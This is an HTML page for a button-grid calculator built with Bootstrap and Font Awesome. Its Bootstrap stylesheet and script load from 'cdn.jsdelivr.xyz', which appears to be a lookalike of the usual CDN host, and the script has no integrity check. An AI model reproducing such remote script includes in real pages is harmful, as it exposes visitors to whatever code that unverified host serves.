<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>calculator</title>
    <link rel="stylesheet" href="./style.css">
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"
    />

<script src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"></script>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />


</head>
<body class="body">
    <div class="card x container-fluid mt-5 bg-transparent" style="width: 25rem;">
        <div class="card-body">

          <div id="textscreen" class="inputnumber">
            <div id="numbersonscreen" class="w-100 fw-bold fs-3 float-end text-white"></div>
          </div>
          
         
            <div class="col1 mt-3">
               <div id="btnmodlus" class="btn bg-transparent" style="color: #53f40e;">%</div>
               <div id="btndivide" class="btn bg-transparent fw-bold" style="color: #53f40e;"">/</div> 
               <div id="btnclear" class="btn  bg-transparent fw-bold" style="color: #53f40e;">C</div>
               <div id="btndelete" class="btn bg-transparent fw-bold" style="color: #53f40e;"><i class="fa-solid fs-5 fa-rectangle-xmark"></i></div>
            </div>

            <div class="col4 mt-2">
                <div id="btn7" class="btn bg-transparent text-white fw-bold">7</div>
                <div id="btn8" class="btn bg-transparent text-white fw-bold">8</div>
                <div id="btn9" class="btn bg-transparent text-white fw-bold">9</div>
                <div id="btnmultiblcation" class="btn bg-transparent fw-bold" style="color: #53f40e;"">x</div> 
            </div>

            <div class="col3 mt-2">
                <div id="btn4" class="btn bg-transparent text-white fw-bold">4</div>
                <div id="btn5" class="btn bg-transparent text-white fw-bold">5</div>
                <div id="btn6" class="btn bg-transparent text-white fw-bold">6</div>
                <div id="btnsubtraction" class="btn bg-transparent fw-bold" style="color: #53f40e;"">-</div> 
            </div>
            

            <div class="col2 mt-2">
                <div id="btn1" class="btn bg-transparent text-white fw-bold">1</div>
                <div id="btn2" class="btn bg-transparent text-white fw-bold">2</div>
                <div id="btn3" class="btn bg-transparent text-white fw-bold">3</div>
                <div id="btnplus" class="btn bg-transparent fw-bold" style="color: #53f40e;"">+</div>
            </div>

            <div class="col5 mt-2">
                <div id="btn00" class="btn bg-transparent text-white fw-bold ">00</div>
                <div id="btn0" class="btn bg-transparent text-white fw-bold ">0</div>
                <div id="btndot" class="btn bg-transparent text-white fw-bold">.</div>
                <div id="btnequal" class="btn bg-transparent fw-bold" style="color: #53f40e;"">=</div> 
            </div>

            
            
        </div>
    </div>

    <script src="./app.js"></script>
</body>
</html>
